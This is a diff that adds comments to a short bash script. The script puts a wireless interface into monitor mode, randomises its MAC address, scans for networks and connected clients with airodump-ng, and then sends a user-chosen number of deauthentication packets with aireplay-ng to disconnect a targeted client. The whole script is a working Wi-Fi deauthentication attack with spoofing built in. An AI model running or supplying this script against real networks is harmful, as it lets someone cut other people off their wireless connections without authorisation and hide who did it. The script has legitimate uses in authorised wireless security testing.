@@ -1,34 +1,33 @@
 #!/bin/bash
 
+# Network interface
 iface="wlan0"
 
-
+# Stop monitor mode
 sudo airmon-ng stop "$iface"mon
-
+# Start monitor mode
 sudo airmon-ng start $iface
-
+# Stop interface service
 sudo ifconfig "$iface"mon down
-
+# Change MAC addres (random)
 sudo macchanger -r "$iface"mon;sleep 2
-
+# Start interface service
 sudo ifconfig "$iface"mon up
-
+# Scan for networks
 sudo airodump-ng "$iface"mon
-
+# Read bssid input
 echo "bssid:"
 read 'bssid'
-
+# Read channel input
 echo "channel:"
 read 'channel'
-
+# Scan for clients
 sudo airodump-ng --bssid $bssid --channel $channel "$iface"mon
-
+# Read mac input
 echo "mac:"
 read 'mac'
-
+# Read number of packets
 echo "number of packets:"
 read 'p'
-
+# Send deauthentication packets and exit monitor mode
 sudo aireplay-ng -0 $p -a $bssid -c $mac "$iface"mon;sudo airmon-ng stop "$iface"mon
-
-
